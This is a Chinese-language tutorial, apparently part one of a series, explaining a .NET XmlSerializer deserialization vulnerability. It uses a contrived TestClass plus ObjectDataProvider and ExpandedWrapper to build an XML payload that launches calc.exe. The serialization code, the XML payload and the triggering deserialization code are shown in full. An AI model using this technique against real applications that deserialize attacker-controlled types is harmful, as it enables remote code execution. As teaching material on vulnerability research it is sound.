# XmlSerializer反序列化漏洞（一）

> 参考：https://paper.seebug.org/837/#22-objecttype

paper中 写的已经很详细，只是作者略过了一些基础的细节，导致对C#新手不太友好，所以这里主要补充一些被忽略的基础细节。

### 1. Deserialize 例子

Deserialize_1 项目中，构建出了了一个 Deserialize的例子。在这个例子中，我们通过借助 TestClass 生成payload，一个xml文件。并用Deserialize 函数反序列化paylaod, 使得其触发代码执行。

#### 1.1 材料

作者首先构建了一个 TestClass 类，这个类的作用是模仿一个可以被用作payload的类，因为该类有一个函数可以接收参数，执行命令。注意漏洞并不在这个类里，而是在反序列化的地方。

这个类就像是原始的矿石，通过一些方法，最终形成可以攻击漏洞的payload。

```c#
    [XmlRoot]
    public class TestClass
    {
        private string classname;
        private string name;
        private int age;
        [XmlAttribute]
        public string Classname { get => classname; set => classname = value; }
        [XmlElement]
        public string Name { get => name; set => name = value; }
        [XmlElement]
        public int Age { get => age; set => age = value; }

        public override string ToString()
        {
            return base.ToString();
        }

        public void ClassMethod(string cmd)
        {
            System.Diagnostics.Process.Start(cmd);
        }
    }
```

#### 1.2 铸剑

我们要把上面的TestClass 类序列化到一个xml文件里。但是如果仅序列化这个TestClass ，那么在反序列化时是不会调用其中的 ClassMethod 函数的。

我们要找到一种方法方式，使得在反序列化时自动调用 ClassMethod 函数。

答案就是 ObjectDataProvider类。

老实说，我没看懂这个类的作用，但不耽误我们了解其特性：

>[ObjectDataProvider](https://docs.microsoft.com/zh-cn/dotnet/api/system.windows.data.objectdataprovider?view=netcore-3.1) 使你能够在 XAML 中创建对象，并使它可用作绑定源。 它提供以下属性，使您能够对您的对象执行查询并绑定到结果。
>
>- 使用 [ConstructorParameters](https://docs.microsoft.com/zh-cn/dotnet/api/system.windows.data.objectdataprovider.constructorparameters?view=netcore-3.1) 属性可将参数传递给对象的构造函数。
>- 使用 [MethodName](https://docs.microsoft.com/zh-cn/dotnet/api/system.windows.data.objectdataprovider.methodname?view=netcore-3.1) 属性调用方法，并使用 [MethodParameters](https://docs.microsoft.com/zh-cn/dotnet/api/system.windows.data.objectdataprovider.methodparameters?view=netcore-3.1) 属性将参数传递给方法。 然后，可以绑定到该方法的结果。

```c#
var testobj = new ObjectDataProvider();
testobj.ObjectInstance = new TestClass();
testobj.MethodName = "ClassMethod";
testobj.MethodParameters.Add("calc.exe");
```

在对ObjectDataProvider 实例的MethodName 参数进行赋值时，该类会主动判断是否可以调用 这个函数。如果这个函数需要输入参数，当参数被添加后，就会立即调用该函数。

也就是说，你只要给属性赋合适的值，在赋值结束后，该实例会直接调用目标类的目标函数。

如果我们可以将这个ObjectDataProvider  序列化到xml文件里，那么在反序列化时，必然会对这几个属性进行赋值，也就是说会触发目标类的目标函数。

> 但是如果用XmlSerializer直接序列化ObjectDataProvider， 会抛出异常，因为在序列化过程中ObjectInstance这个成员类型未知，不过可以使用ExpandedWrapper扩展类在系统内部预先加载相关实体的查询来避免异常错误。

```c#
public static void serializeObjectWithXmlSer()
{

    ExpandedWrapper<TestClass, ObjectDataProvider> wrapper = new ExpandedWrapper<TestClass, ObjectDataProvider>();
    wrapper.ProjectedProperty0 = new ObjectDataProvider();
    wrapper.ProjectedProperty0.ObjectInstance = new TestClass();
    //wrapper.ProjectedProperty0.ObjectType = typeof(TestClass);
    wrapper.ProjectedProperty0.MethodName = "ClassMethod";
    wrapper.ProjectedProperty0.MethodParameters.Add("calc.exe");

    XmlSerializer serializer = new XmlSerializer(typeof(ExpandedWrapper<TestClass, ObjectDataProvider>));
    TextWriter fo = new StreamWriter("./xmlser.txt");
    serializer.Serialize(fo, wrapper);
    fo.Close();
}
```

最终我们会生成一个xml文件，如下：

```xml
<?xml version="1.0" encoding="utf-8"?>
<ExpandedWrapperOfTestClassObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ProjectedProperty0>
    <ObjectInstance xsi:type="TestClass">
      <Age>0</Age>
    </ObjectInstance>
    <MethodName>ClassMethod</MethodName>
    <MethodParameters>
      <anyType xsi:type="xsd:string">calc.exe</anyType>
    </MethodParameters>
  </ProjectedProperty0>
</ExpandedWrapperOfTestClassObjectDataProvider>
```

该xml文件就是我们的paylaod。

#### 1.3 利用

XmlSerializer 在实例化的时候，需要目标类的类型作为输入参数:

作者提到了3中获取目标类类型的方式：typeof、object.Type、Type.GetType()。

其中最关键的是 Type.GetType()，因为他只需要一个类名称作为输入参数，条件要求极低。

这里有一个问题，我们要如何获取一个类的完全限定名称？这可难倒我菜鸡小叮当了。具体方法如下：

```c#
Type targetType  = typeof(ExpandedWrapper<XamlReader, ObjectDataProvider>);
String targetTypeName = targetType.AssemblyQualifiedName;
Console.WriteLine(targetTypeName);
```

完整的利用代码如下：

```c#
public static void DeserializerFromXml()
{
    using (var stream = new FileStream("./xmlser.txt", FileMode.Open))
    {
        Type targetType  = typeof(ExpandedWrapper<XamlReader, ObjectDataProvider>);
        String targetTypeName = targetType.AssemblyQualifiedName;
        Console.WriteLine(targetTypeName);
        var serializers = new XmlSerializer(Type.GetType(targetTypeName));
        serializers.Deserialize(stream);
    }
}
```

这里有两个关键：

- 第一，我们可以控制targetTypename，潜在要求是目标使用 Type.GetType的方式从用户输入获取类的类型。
- 第二，我们可以控制 stream，即反序列化的输入。

只要满足这两个条件，我们就可以在反序列化时执行代码。

但是着一切都构建在TestClass 的基础上，现实中没有 TestClass，我们又该去执行哪个类的什么函数呢？

且听下回分解。